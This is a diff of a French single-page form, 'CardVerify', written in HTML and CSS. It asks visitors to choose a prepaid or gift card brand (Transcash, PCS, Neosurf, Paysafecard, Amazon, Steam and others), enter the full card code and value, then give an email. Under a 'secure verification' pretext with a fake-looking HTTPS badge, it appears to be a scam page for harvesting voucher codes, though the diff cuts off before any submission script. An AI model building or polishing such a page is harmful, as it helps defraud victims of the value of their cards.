@@ -1,601 +1,508 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>CardVerify — Soumission de carte cadeau</title>
-  <meta name="description" content="Soumettez votre code de carte cadeau en toute sécurité." />
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Mono:wght@300;400;500&family=Lato:wght@300;400;700&display=swap" rel="stylesheet" />
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>CardVerify — Vérification de carte cadeau</title>
+  <meta name="description" content="Soumettez votre code de carte cadeau en toute sécurité."/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Mono:wght@400;500&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
   <style>
-    /* ─── Variables ──────────────────────────────────────────────── */
-    :root {
-      --bg:         #09090f;
-      --bg2:        #0e0e1a;
-      --bg3:        #13131f;
-      --surface:    rgba(255,255,255,0.04);
-      --surface2:   rgba(255,255,255,0.07);
-      --border:     rgba(139,120,255,0.25);
-      --border2:    rgba(255,255,255,0.07);
-      --accent:     #8b78ff;
-      --accent2:    #a594ff;
-      --accent-dim: rgba(139,120,255,0.12);
-      --accent-glow:rgba(139,120,255,0.3);
-      --text:       #f0eeff;
-      --text2:      #a8a3c1;
-      --text3:      #6b6585;
-      --green:      #63e6be;
-      --red:        #ff6b7a;
-      --font-head:  'Syne', sans-serif;
-      --font-body:  'Lato', sans-serif;
-      --font-mono:  'DM Mono', monospace;
-      --radius:     14px;
-      --radius-sm:  8px;
-      --t:          0.25s cubic-bezier(0.4,0,0.2,1);
+    :root{
+      --bg:       #09090f;
+      --bg2:      #0e0e1a;
+      --bg3:      #13131f;
+      --sur:      rgba(255,255,255,0.04);
+      --sur2:     rgba(255,255,255,0.07);
+      --brd:      rgba(139,120,255,0.28);
+      --brd2:     rgba(255,255,255,0.07);
+      --acc:      #8b78ff;
+      --acc2:     #a594ff;
+      --adim:     rgba(139,120,255,0.13);
+      --aglow:    rgba(139,120,255,0.32);
+      --tx:       #f0eeff;
+      --tx2:      #a8a3c1;
+      --tx3:      #6b6585;
+      --grn:      #63e6be;
+      --gdim:     rgba(99,230,190,0.10);
+      --red:      #ff6b7a;
+      --rdim:     rgba(255,107,122,0.10);
+      --fh:       'Syne',sans-serif;
+      --fb:       'Inter',sans-serif;
+      --fm:       'DM Mono',monospace;
+      --r:        14px;
+      --rs:       9px;
+      --rl:       20px;
+      --t:        .24s cubic-bezier(.4,0,.2,1);
     }
-
-    /* ─── Reset ──────────────────────────────────────────────────── */
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    html { scroll-behavior: smooth; }
-    body {
-      background: var(--bg);
-      color: var(--text);
-      font-family: var(--font-body);
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 24px;
-      -webkit-font-smoothing: antialiased;
-      position: relative;
-      overflow-x: hidden;
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    html{scroll-behavior:smooth}
+    body{
+      background:var(--bg);color:var(--tx);font-family:var(--fb);
+      min-height:100vh;display:flex;flex-direction:column;
+      align-items:center;justify-content:center;
+      padding:24px 16px;-webkit-font-smoothing:antialiased;overflow-x:hidden;
     }
-
-    /* ─── Background orbs ────────────────────────────────────────── */
-    .orb {
-      position: fixed; border-radius: 50%; pointer-events: none;
-      filter: blur(70px); z-index: 0;
-    }
-    .orb-1 { width: 500px; height: 500px; background: radial-gradient(circle, rgba(139,120,255,0.14) 0%, transparent 70%); top: -150px; right: -100px; }
-    .orb-2 { width: 350px; height: 350px; background: radial-gradient(circle, rgba(99,230,190,0.07) 0%, transparent 70%); bottom: -50px; left: -80px; }
-
-    /* ─── Container ──────────────────────────────────────────────── */
-    .wrapper {
-      width: 100%; max-width: 520px;
-      position: relative; z-index: 1;
-      animation: fade-up 0.6s ease both;
-    }
-    @keyframes fade-up { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
-
-    /* ─── Header ─────────────────────────────────────────────────── */
-    .header { text-align: center; margin-bottom: 32px; }
-    .logo {
-      display: inline-flex; align-items: center; gap: 10px;
-      font-family: var(--font-head); font-weight: 800; font-size: 1.4rem;
-      letter-spacing: -0.03em; margin-bottom: 12px;
-    }
-    .logo-icon {
-      width: 40px; height: 40px; border-radius: 11px;
-      background: linear-gradient(135deg, var(--accent), #6c5ce7);
-      display: grid; place-items: center; font-size: 18px;
-      box-shadow: 0 8px 24px var(--accent-glow);
-    }
-    .header-sub { color: var(--text2); font-size: 0.9rem; }
-
-    /* ─── Card ───────────────────────────────────────────────────── */
-    .card {
-      background: var(--bg2);
-      border: 1px solid var(--border2);
-      border-radius: 20px;
-      padding: 36px 32px;
-      position: relative;
-      overflow: hidden;
-    }
-    .card::before {
-      content: '';
-      position: absolute; top: 0; left: 0; right: 0; height: 1px;
-      background: linear-gradient(90deg, transparent, var(--accent), transparent);
-    }
-
-    /* ─── Step indicator ─────────────────────────────────────────── */
-    .steps-bar {
-      display: flex; align-items: center; gap: 0;
-      margin-bottom: 28px;
-    }
-    .step-dot {
-      display: flex; align-items: center; gap: 8px; flex: 1;
-      font-size: 0.75rem; color: var(--text3); font-family: var(--font-mono);
-      transition: color var(--t);
-    }
-    .step-dot.active { color: var(--accent2); }
-    .step-dot.done { color: var(--green); }
-    .step-dot-num {
-      width: 24px; height: 24px; border-radius: 50%;
-      background: var(--surface); border: 1px solid var(--border2);
-      display: grid; place-items: center; font-size: 0.7rem; font-weight: 600;
-      flex-shrink: 0; transition: var(--t);
-    }
-    .step-dot.active .step-dot-num { background: var(--accent-dim); border-color: var(--border); color: var(--accent2); }
-    .step-dot.done .step-dot-num { background: rgba(99,230,190,0.15); border-color: rgba(99,230,190,0.3); color: var(--green); }
-    .step-line { flex: 1; height: 1px; background: var(--border2); margin: 0 4px; }
-
-    /* ─── Form sections ──────────────────────────────────────────── */
-    .form-section { display: none; }
-    .form-section.active { display: block; animation: fade-up 0.4s ease both; }
-
-    .section-title {
-      font-family: var(--font-head); font-weight: 700; font-size: 1rem;
-      margin-bottom: 20px; color: var(--text);
-    }
-
-    /* ─── Card type selector ─────────────────────────────────────── */
-    .card-grid {
-      display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px;
-      margin-bottom: 8px;
-    }
-    .card-type-btn {
-      background: var(--surface); border: 1px solid var(--border2);
-      border-radius: var(--radius-sm); padding: 10px 6px;
-      cursor: pointer; transition: var(--t); text-align: center;
-      display: flex; flex-direction: column; align-items: center; gap: 5px;
-    }
-    .card-type-btn:hover { background: var(--accent-dim); border-color: var(--border); }
-    .card-type-btn.selected { background: var(--accent-dim); border-color: var(--accent); box-shadow: 0 0 0 1px var(--accent); }
-    .card-type-btn .ct-emoji { font-size: 1.4rem; }
-    .card-type-btn .ct-name { font-size: 0.65rem; color: var(--text2); font-family: var(--font-mono); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; width: 100%; }
-    .card-type-btn.selected .ct-name { color: var(--accent2); }
-
-    /* ─── Inputs ─────────────────────────────────────────────────── */
-    .field { margin-bottom: 18px; }
-    .field label {
-      display: block; font-size: 0.8rem; color: var(--text2); margin-bottom: 7px;
-      font-family: var(--font-mono); letter-spacing: 0.03em;
-    }
-    .field label span { color: var(--red); margin-left: 2px; }
-    .field input, .field textarea, .field select {
-      width: 100%; background: rgba(0,0,0,0.3);
-      border: 1px solid var(--border2); border-radius: var(--radius-sm);
-      padding: 12px 14px; color: var(--text); font-family: var(--font-body);
-      font-size: 0.95rem; outline: none; transition: border-color var(--t), box-shadow var(--t);
-      -webkit-appearance: none;
-    }
-    .field input:focus, .field textarea:focus, .field select:focus {
-      border-color: var(--accent);
-      box-shadow: 0 0 0 3px var(--accent-dim);
-    }
-    .field input.error { border-color: var(--red); box-shadow: 0 0 0 3px rgba(255,107,122,0.12); }
-    .field input.success { border-color: var(--green); }
-    .field .hint { font-size: 0.75rem; color: var(--text3); margin-top: 6px; font-family: var(--font-mono); }
-    .field .field-error { font-size: 0.75rem; color: var(--red); margin-top: 6px; display: none; }
-    .field.has-error .field-error { display: block; }
-
-    /* Code input spécial */
-    .code-input {
-      font-family: var(--font-mono) !important;
-      font-size: 1.1rem !important;
-      letter-spacing: 0.15em !important;
-      text-align: center;
-    }
-
-    /* ─── Buttons ────────────────────────────────────────────────── */
-    .btn {
-      display: inline-flex; align-items: center; justify-content: center; gap: 8px;
-      width: 100%; padding: 14px; border-radius: 50px;
-      font-weight: 700; font-size: 0.95rem; border: none; cursor: pointer;
-      transition: var(--t); font-family: var(--font-body);
-    }
-    .btn-primary {
-      background: linear-gradient(135deg, var(--accent), #6c5ce7);
-      color: #fff;
-    }
-    .btn-primary:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 12px 32px var(--accent-glow); }
-    .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; box-shadow: none; }
-    .btn-ghost {
-      background: none; border: 1px solid var(--border2); color: var(--text2);
-      width: auto; padding: 10px 20px; font-size: 0.85rem;
-    }
-    .btn-ghost:hover { border-color: var(--border); color: var(--text); background: var(--surface); }
-    .btn-row { display: flex; align-items: center; justify-content: space-between; gap: 12px; margin-top: 8px; }
-
-    /* ─── Loading spinner ────────────────────────────────────────── */
-    .spinner {
-      width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.25);
-      border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite;
-      display: none;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .btn.loading .spinner { display: block; }
-    .btn.loading .btn-label { display: none; }
-
-    /* ─── Success state ──────────────────────────────────────────── */
-    .success-screen {
-      display: none; text-align: center; padding: 16px 0;
-      animation: fade-up 0.5s ease both;
-    }
-    .success-screen.visible { display: block; }
-    .success-icon {
-      width: 72px; height: 72px; border-radius: 50%; margin: 0 auto 20px;
-      background: rgba(99,230,190,0.12); border: 2px solid rgba(99,230,190,0.3);
-      display: grid; place-items: center; font-size: 2rem;
-    }
-    .success-title { font-family: var(--font-head); font-size: 1.3rem; font-weight: 800; margin-bottom: 10px; }
-    .success-sub { color: var(--text2); font-size: 0.9rem; margin-bottom: 24px; line-height: 1.6; }
-    .success-detail {
-      background: var(--surface); border: 1px solid var(--border2);
-      border-radius: var(--radius-sm); padding: 14px 18px; text-align: left; margin-bottom: 24px;
-    }
-    .success-detail-row { display: flex; justify-content: space-between; align-items: center; padding: 6px 0; border-bottom: 1px solid var(--border2); }
-    .success-detail-row:last-child { border-bottom: none; }
-    .success-detail-label { font-size: 0.78rem; color: var(--text3); font-family: var(--font-mono); }
-    .success-detail-value { font-size: 0.82rem; color: var(--text2); font-weight: 600; }
-    .btn-reset { background: var(--accent-dim); border: 1px solid var(--border); color: var(--accent2); border-radius: 50px; padding: 12px 28px; font-weight: 700; cursor: pointer; font-family: var(--font-body); transition: var(--t); }
-    .btn-reset:hover { background: rgba(139,120,255,0.2); }
-
-    /* ─── Error banner ───────────────────────────────────────────── */
-    .error-banner {
-      background: rgba(255,107,122,0.1); border: 1px solid rgba(255,107,122,0.3);
-      border-radius: var(--radius-sm); padding: 12px 16px;
-      color: var(--red); font-size: 0.85rem; margin-bottom: 16px;
-      display: none; align-items: center; gap: 8px;
-    }
-    .error-banner.visible { display: flex; }
-
-    /* ─── Progress bar ───────────────────────────────────────────── */
-    .progress-bar {
-      height: 2px; background: var(--surface2); border-radius: 1px; margin-bottom: 28px; overflow: hidden;
-    }
-    .progress-fill {
-      height: 100%; background: linear-gradient(90deg, var(--accent), var(--accent2));
-      border-radius: 1px; transition: width 0.4s ease;
-    }
-
-    /* ─── Responsive ─────────────────────────────────────────────── */
-    @media (max-width: 480px) {
-      .card { padding: 24px 20px; }
-      .card-grid { grid-template-columns: repeat(4, 1fr); gap: 6px; }
-      .card-type-btn { padding: 8px 4px; }
-      .card-type-btn .ct-emoji { font-size: 1.1rem; }
+    .orb{position:fixed;border-radius:50%;pointer-events:none;filter:blur(80px);z-index:0}
+    .orb1{width:600px;height:600px;background:radial-gradient(circle,rgba(139,120,255,.13) 0%,transparent 70%);top:-200px;right:-150px;animation:of 20s ease-in-out infinite alternate}
+    .orb2{width:400px;height:400px;background:radial-gradient(circle,rgba(99,230,190,.06) 0%,transparent 70%);bottom:-80px;left:-100px;animation:of 16s ease-in-out infinite alternate-reverse}
+    @keyframes of{0%{transform:translate(0,0) scale(1)}100%{transform:translate(20px,30px) scale(1.06)}}
+    .wrap{width:100%;max-width:560px;position:relative;z-index:1;animation:fu .55s ease both}
+    @keyframes fu{from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:translateY(0)}}
+    .hdr{text-align:center;margin-bottom:28px}
+    .logo{display:inline-flex;align-items:center;gap:11px;font-family:var(--fh);font-weight:800;font-size:1.45rem;letter-spacing:-.035em;margin-bottom:8px}
+    .logo-ic{width:42px;height:42px;border-radius:12px;background:linear-gradient(135deg,var(--acc),#6c5ce7);display:grid;place-items:center;font-size:19px;box-shadow:0 6px 22px var(--aglow);flex-shrink:0}
+    .hdr p{color:var(--tx2);font-size:.875rem}
+    .badge{display:inline-flex;align-items:center;gap:6px;background:var(--gdim);border:1px solid rgba(99,230,190,.2);color:var(--grn);font-size:.72rem;padding:4px 12px;border-radius:50px;font-family:var(--fm);margin-top:10px}
+    .badge::before{content:'●';animation:pg 2s infinite}
+    @keyframes pg{0%,100%{opacity:1}50%{opacity:.4}}
+    .card{background:var(--bg2);border:1px solid var(--brd2);border-radius:var(--rl);padding:36px 32px 32px;position:relative;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,.4)}
+    .card::before{content:'';position:absolute;top:0;left:10%;right:10%;height:1px;background:linear-gradient(90deg,transparent,var(--acc),transparent)}
+    .pw{margin-bottom:26px}
+    .pb{height:3px;background:var(--sur2);border-radius:2px;overflow:hidden;margin-bottom:14px}
+    .pf{height:100%;background:linear-gradient(90deg,var(--acc),var(--acc2));border-radius:2px;transition:width .5s cubic-bezier(.4,0,.2,1);box-shadow:0 0 8px var(--aglow)}
+    .sr{display:flex;align-items:center}
+    .si{display:flex;align-items:center;gap:6px;flex:1;font-size:.7rem;color:var(--tx3);font-family:var(--fm);transition:color var(--t)}
+    .si.active{color:var(--acc2)}
+    .si.done{color:var(--grn)}
+    .sn{width:22px;height:22px;border-radius:50%;flex-shrink:0;display:grid;place-items:center;font-size:.68rem;font-weight:700;background:var(--sur);border:1px solid var(--brd2);transition:var(--t)}
+    .si.active .sn{background:var(--adim);border-color:var(--brd);color:var(--acc2)}
+    .si.done   .sn{background:var(--gdim);border-color:rgba(99,230,190,.25);color:var(--grn)}
+    .sc{flex:1;height:1px;background:var(--brd2);margin:0 3px;max-width:40px}
+    .sec{display:none}
+    .sec.active{display:block;animation:fu .35s ease both}
+    .sh{font-family:var(--fh);font-weight:700;font-size:1.05rem;margin-bottom:20px;color:var(--tx)}
+    .sh span{color:var(--acc2)}
+    .ctg{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:20px}
+    .ctb{background:var(--sur);border:1px solid var(--brd2);border-radius:var(--rs);padding:12px 6px 10px;cursor:pointer;transition:var(--t);text-align:center;display:flex;flex-direction:column;align-items:center;gap:8px;position:relative;overflow:hidden;}
+    .ctb:hover{background:var(--adim);border-color:var(--brd);transform:translateY(-2px)}
+    .ctb.sel{background:var(--adim);border-color:var(--acc);box-shadow:0 0 0 1px var(--acc),0 4px 16px var(--aglow);transform:translateY(-2px)}
+    .ctb::after{content:'✓';position:absolute;top:4px;right:6px;font-size:.6rem;color:var(--acc2);opacity:0;transition:var(--t)}
+    .ctb.sel::after{opacity:1}
+    .ct-logo{width:40px;height:40px;border-radius:8px;display:flex;align-items:center;justify-content:center;overflow:hidden;background:#fff;flex-shrink:0;}
+    .ct-logo img{width:32px;height:32px;object-fit:contain;display:block}
+    .ct-logo.dark{background:var(--bg3)}
+    .ct-logo svg{width:28px;height:28px}
+    .ct-name{font-size:.62rem;color:var(--tx2);font-family:var(--fm);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;width:100%;text-align:center}
+    .ctb.sel .ct-name{color:var(--acc2)}
+    .field{margin-bottom:16px}
+    .frow{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px}
+    label{display:block;font-size:.775rem;color:var(--tx2);margin-bottom:7px;font-family:var(--fm);letter-spacing:.02em}
+    label .req{color:var(--red);margin-left:2px}
+    input,select{width:100%;background:rgba(0,0,0,.28);border:1px solid var(--brd2);border-radius:var(--rs);padding:11px 14px;color:var(--tx);font-family:var(--fb);font-size:.93rem;outline:none;transition:border-color var(--t),box-shadow var(--t),background var(--t);-webkit-appearance:none;}
+    input:hover,select:hover{border-color:rgba(255,255,255,.12)}
+    input:focus,select:focus{border-color:var(--acc);box-shadow:0 0 0 3px var(--adim);background:rgba(0,0,0,.38)}
+    input.ok{border-color:var(--grn)}
+    input.err{border-color:var(--red);box-shadow:0 0 0 3px var(--rdim)}
+    select option{background:var(--bg3);color:var(--tx)}
+    .fhint{font-size:.72rem;color:var(--tx3);margin-top:5px;font-family:var(--fm)}
+    .ferr{font-size:.72rem;color:var(--red);margin-top:5px;display:none}
+    .field.has-err .ferr{display:block}
+    .field.has-err input{border-color:var(--red) !important;box-shadow:0 0 0 3px var(--rdim) !important}
+    .field.has-err select{border-color:var(--red) !important;box-shadow:0 0 0 3px var(--rdim) !important}
+    .cwrap{position:relative}
+    .cwrap input{font-family:var(--fm) !important;font-size:1.05rem !important;letter-spacing:.18em !important;text-align:center;padding-right:48px}
+    .ctog{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;font-size:1.15rem;color:var(--tx3);transition:color var(--t);padding:4px;border-radius:6px;line-height:1}
+    .ctog:hover{color:var(--acc2)}
+    .btn{display:inline-flex;align-items:center;justify-content:center;gap:9px;padding:13px 22px;border-radius:50px;font-weight:600;font-size:.92rem;border:none;cursor:pointer;transition:var(--t);font-family:var(--fb);white-space:nowrap}
+    .btnp{background:linear-gradient(135deg,var(--acc),#6c5ce7);color:#fff;width:100%;position:relative;overflow:hidden}
+    .btnp::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.12),transparent);opacity:0;transition:var(--t)}
+    .btnp:hover:not(:disabled)::before{opacity:1}
+    .btnp:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 10px 30px var(--aglow)}
+    .btnp:active:not(:disabled){transform:translateY(0)}
+    .btnp:disabled{opacity:.45;cursor:not-allowed}
+    .btng{background:none;border:1px solid var(--brd2);color:var(--tx2);padding:11px 20px;font-size:.85rem}
+    .btng:hover{border-color:var(--brd);color:var(--tx);background:var(--sur)}
+    .brow{display:flex;align-items:center;gap:10px;margin-top:6px}
+    .brow .btnp{flex:1}
+    .spin{width:17px;height:17px;border-radius:50%;border:2px solid rgba(255,255,255,.22);border-top-color:#fff;animation:sp .65s linear infinite;display:none}
+    @keyframes sp{to{transform:rotate(360deg)}}
+    .btn.loading .btxt{display:none}
+    .btn.loading .spin{display:block}
+    .eb{display:none;align-items:flex-start;gap:10px;background:var(--rdim);border:1px solid rgba(255,107,122,.28);border-radius:var(--rs);padding:12px 14px;color:var(--red);font-size:.845rem;line-height:1.5;margin-bottom:16px}
+    .eb.show{display:flex;animation:fu .25s ease}
+    .ss{display:none;text-align:center;padding:8px 0}
+    .ss.show{display:block;animation:fu .45s ease both}
+    .sic{width:80px;height:80px;border-radius:50%;margin:0 auto 22px;background:var(--gdim);border:2px solid rgba(99,230,190,.28);display:grid;place-items:center;animation:pop .5s cubic-bezier(.34,1.56,.64,1) both}
+    @keyframes pop{from{transform:scale(.5);opacity:0}to{transform:scale(1);opacity:1}}
+    .sic span{font-size:2.2rem}
+    .stit{font-family:var(--fh);font-size:1.35rem;font-weight:800;margin-bottom:10px;letter-spacing:-.02em}
+    .ssub{color:var(--tx2);font-size:.88rem;line-height:1.65;margin-bottom:24px}
+    .srec{background:var(--sur);border:1px solid var(--brd2);border-radius:var(--r);padding:6px 0;margin-bottom:24px;text-align:left}
+    .rr{display:flex;align-items:center;justify-content:space-between;padding:10px 18px;border-bottom:1px solid var(--brd2)}
+    .rr:last-child{border-bottom:none}
+    .rl{font-size:.75rem;color:var(--tx3);font-family:var(--fm)}
+    .rv{font-size:.82rem;color:var(--tx2);font-weight:600}
+    .rv.g{color:var(--grn)}
+    .btnn{background:var(--adim);border:1px solid var(--brd);color:var(--acc2);border-radius:50px;padding:12px 30px;font-weight:700;cursor:pointer;font-family:var(--fb);font-size:.9rem;transition:var(--t)}
+    .btnn:hover{background:rgba(139,120,255,.22);transform:translateY(-1px)}
+    .ft{text-align:center;margin-top:18px;font-size:.72rem;color:var(--tx3);font-family:var(--fm)}
+    @media(max-width:480px){
+      .card{padding:24px 18px 22px}
+      .ctg{gap:5px}
+      .ctb{padding:10px 4px 8px}
+      .ct-logo{width:34px;height:34px}
+      .ct-logo img{width:26px;height:26px}
+      .frow{grid-template-columns:1fr;gap:0}
     }
   </style>
 </head>
 <body>
-  <div class="orb orb-1"></div>
-  <div class="orb orb-2"></div>
 
-  <div class="wrapper">
-    <!-- Header -->
-    <div class="header">
-      <div class="logo">
-        <div class="logo-icon">✦</div>
-        CardVerify
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
+
+<div class="wrap">
+
+  <header class="hdr">
+    <div class="logo">
+      <div class="logo-ic">✦</div>
+      CardVerify
+    </div>
+    <p>Vérification sécurisée de cartes cadeaux</p>
+    <div class="badge">Connexion sécurisée HTTPS</div>
+  </header>
+
+  <div class="card">
+
+    <div class="pw" id="pw">
+      <div class="pb"><div class="pf" id="pf" style="width:33%"></div></div>
+      <div class="sr">
+        <div class="si active" id="s1"><div class="sn">1</div>Carte</div>
+        <div class="sc"></div>
+        <div class="si" id="s2"><div class="sn">2</div>Code</div>
+        <div class="sc"></div>
+        <div class="si" id="s3"><div class="sn">3</div>Email</div>
       </div>
-      <p class="header-sub">Soumettez votre code de carte cadeau en toute sécurité</p>
     </div>
 
-    <!-- Card principale -->
-    <div class="card">
+    <div class="eb" id="eb"><span>⚠️</span><span id="em"></span></div>
 
-      <!-- Barre de progression -->
-      <div class="progress-bar">
-        <div class="progress-fill" id="progressFill" style="width:33%"></div>
+    <!-- ÉTAPE 1 — TYPE DE CARTE -->
+    <div class="sec active" id="sec1">
+      <div class="sh">Quel type de <span>carte cadeau</span> ?</div>
+      <div class="ctg">
+        <button class="ctb" data-type="amazon" data-label="Amazon" data-min="14" data-max="16">
+          <div class="ct-logo"><img src="https://logo.clearbit.com/amazon.com" alt="Amazon" onerror="this.parentNode.innerHTML='<svg viewBox=\'0 0 48 48\' xmlns=\'http://www.w3.org/2000/svg\'><text y=\'36\' font-size=\'30\'>📦</text></svg>'"/></div>
+          <span class="ct-name">Amazon</span>
+        </button>
+        <button class="ctb" data-type="itunes" data-label="iTunes" data-min="16" data-max="16">
+          <div class="ct-logo"><img src="https://logo.clearbit.com/apple.com" alt="iTunes" onerror="this.parentNode.innerHTML='<svg viewBox=\'0 0 48 48\' xmlns=\'http://www.w3.org/2000/svg\'><text y=\'36\' font-size=\'30\'>🎵</text></svg>'"/></div>
+          <span class="ct-name">iTunes</span>
+        </button>
+        <button class="ctb" data-type="neosurf" data-label="Neosurf" data-min="10" data-max="10">
+          <div class="ct-logo"><img src="https://logo.clearbit.com/neosurf.com" alt="Neosurf" onerror="this.parentNode.innerHTML='<svg viewBox=\'0 0 48 48\' xmlns=\'http://www.w3.org/2000/svg\'><rect width=\'48\' height=\'48\' rx=\'8\' fill=\'#00a651\'/><text y=\'32\' x=\'4\' font-size=\'10\' font-weight=\'bold\' fill=\'#fff\' font-family=\'Arial\'>neosurf</text></svg>'"/></div>
+          <span class="ct-name">Neosurf</span>
+        </button>
+        <button class="ctb" data-type="pcs" data-label="PCS" data-min="16" data-max="16">
+          <div class="ct-logo"><img src="https://logo.clearbit.com/pcs-mastercard.fr" alt="PCS" onerror="this.parentNode.innerHTML='<svg viewBox=\'0 0 48 48\' xmlns=\'http://www.w3.org/2000/svg\'><circle cx=\'20\' cy=\'24\' r=\'12\' fill=\'#eb001b\'/><circle cx=\'28\' cy=\'24\' r=\'12\' fill=\'#f79e1b\' opacity=\'.85\'/></svg>'"/></div>
+          <span class="ct-name">PCS</span>
+        </button>
+        <button class="ctb" data-type="paysafecard" data-label="Paysafecard" data-min="16" data-max="16">
+          <div class="ct-logo"><img src="https://logo.clearbit.com/paysafecard.com" alt="Paysafecard" onerror="this.parentNode.innerHTML='<svg viewBox=\'0 0 48 48\' xmlns=\'http://www.w3.org/2000/svg\'><rect width=\'48\' height=\'48\' rx=\'8\' fill=\'#00529b\'/><text y=\'34\' x=\'6\' font-size=\'13\' font-weight=\'bold\' fill=\'#fff\' font-family=\'Arial\'>psc</text></svg>'"/></div>
+          <span class="ct-name">Paysafecard</span>
+        </button>
+        <button class="ctb" data-type="steam" data-label="Steam" data-min="15" data-max="15">
+          <div class="ct-logo dark"><img src="https://logo.clearbit.com/steampowered.com" alt="Steam" onerror="this.parentNode.innerHTML='<svg viewBox=\'0 0 48 48\' xmlns=\'http://www.w3.org/2000/svg\'><text y=\'36\' font-size=\'30\'>🎮</text></svg>'"/></div>
+          <span class="ct-name">Steam</span>
+        </button>
+        <button class="ctb" data-type="transcash" data-label="Transcash" data-min="14" data-max="14">
+          <div class="ct-logo"><img src="https://logo.clearbit.com/transcash.fr" alt="Transcash" onerror="this.parentNode.innerHTML='<svg viewBox=\'0 0 48 48\' xmlns=\'http://www.w3.org/2000/svg\'><rect width=\'48\' height=\'48\' rx=\'8\' fill=\'#e30613\'/><text y=\'32\' x=\'6\' font-size=\'11\' font-weight=\'bold\' fill=\'#fff\' font-family=\'Arial\'>TRANS</text></svg>'"/></div>
+          <span class="ct-name">Transcash</span>
+        </button>
+        <button class="ctb" data-type="vanilla" data-label="Vanilla" data-min="16" data-max="16">
+          <div class="ct-logo"><img src="https://logo.clearbit.com/vanillagift.com" alt="Vanilla" onerror="this.parentNode.innerHTML='<svg viewBox=\'0 0 48 48\' xmlns=\'http://www.w3.org/2000/svg\'><rect width=\'48\' height=\'48\' rx=\'8\' fill=\'#5d2d91\'/><text y=\'32\' x=\'4\' font-size=\'11\' font-weight=\'bold\' fill=\'#fff\' font-family=\'Arial\'>VANILLA</text></svg>'"/></div>
+          <span class="ct-name">Vanilla</span>
+        </button>
       </div>
-
-      <!-- Indicateur d'étapes -->
-      <div class="steps-bar" id="stepsBar">
-        <div class="step-dot active" id="stepDot1">
-          <div class="step-dot-num">1</div>
-          Type
-        </div>
-        <div class="step-line"></div>
-        <div class="step-dot" id="stepDot2">
-          <div class="step-dot-num">2</div>
-          Code
-        </div>
-        <div class="step-line"></div>
-        <div class="step-dot" id="stepDot3">
-          <div class="step-dot-num">3</div>
-          Infos
-        </div>
+      <div class="field" id="tef" style="display:none">
+        <div class="ferr" style="display:block">Veuillez sélectionner un type de carte.</div>
       </div>
-
-      <!-- Bannière d'erreur globale -->
-      <div class="error-banner" id="errorBanner">
-        <span>⚠️</span>
-        <span id="errorBannerText"></span>
-      </div>
-
-      <!-- ── ÉTAPE 1 : Choix du type de carte ── -->
-      <div class="form-section active" id="step1">
-        <div class="section-title">Quel type de carte ?</div>
-        <div class="card-grid" id="cardGrid">
-          <button class="card-type-btn" data-type="amazon"><span class="ct-emoji">📦</span><span class="ct-name">Amazon</span></button>
-          <button class="card-type-btn" data-type="itunes"><span class="ct-emoji">🎵</span><span class="ct-name">iTunes</span></button>
-          <button class="card-type-btn" data-type="neosurf"><span class="ct-emoji">💳</span><span class="ct-name">Neosurf</span></button>
-          <button class="card-type-btn" data-type="pcs"><span class="ct-emoji">🏪</span><span class="ct-name">PCS</span></button>
-          <button class="card-type-btn" data-type="paysafecard"><span class="ct-emoji">🔐</span><span class="ct-name">Paysafe</span></button>
-          <button class="card-type-btn" data-type="steam"><span class="ct-emoji">🎮</span><span class="ct-name">Steam</span></button>
-          <button class="card-type-btn" data-type="transcash"><span class="ct-emoji">💸</span><span class="ct-name">Transcash</span></button>
-          <button class="card-type-btn" data-type="vanilla"><span class="ct-emoji">🍦</span><span class="ct-name">Vanilla</span></button>
-        </div>
-        <div class="field has-error" id="typeError" style="display:none">
-          <div class="field-error" style="display:block">Veuillez sélectionner un type de carte.</div>
-        </div>
-        <div style="margin-top:20px">
-          <button class="btn btn-primary" onclick="goToStep2()">
-            <span class="btn-label">Continuer →</span>
-          </button>
-        </div>
-      </div>
-
-      <!-- ── ÉTAPE 2 : Saisie du code ── -->
-      <div class="form-section" id="step2">
-        <div class="section-title" id="step2Title">Entrez votre code</div>
-        <div class="field" id="codeField">
-          <label>Code de la carte <span>*</span></label>
-          <input type="text" id="cardCode" class="code-input" placeholder="XXXX-XXXX-XXXX-XXXX" autocomplete="off" spellcheck="false" />
-          <div class="hint" id="codeHint">Saisissez le code tel qu'il apparaît sur la carte</div>
-          <div class="field-error" id="codeError">Code invalide.</div>
-        </div>
-        <div class="field">
-          <label>Montant (optionnel)</label>
-          <input type="text" id="amount" placeholder="ex: 25€, 50$" />
-          <div class="hint">Valeur faciale de la carte</div>
-        </div>
-        <div class="btn-row">
-          <button class="btn btn-ghost" onclick="goToStep(1)">← Retour</button>
-          <button class="btn btn-primary" style="flex:1" onclick="goToStep3()">
-            <span class="btn-label">Continuer →</span>
-          </button>
-        </div>
-      </div>
-
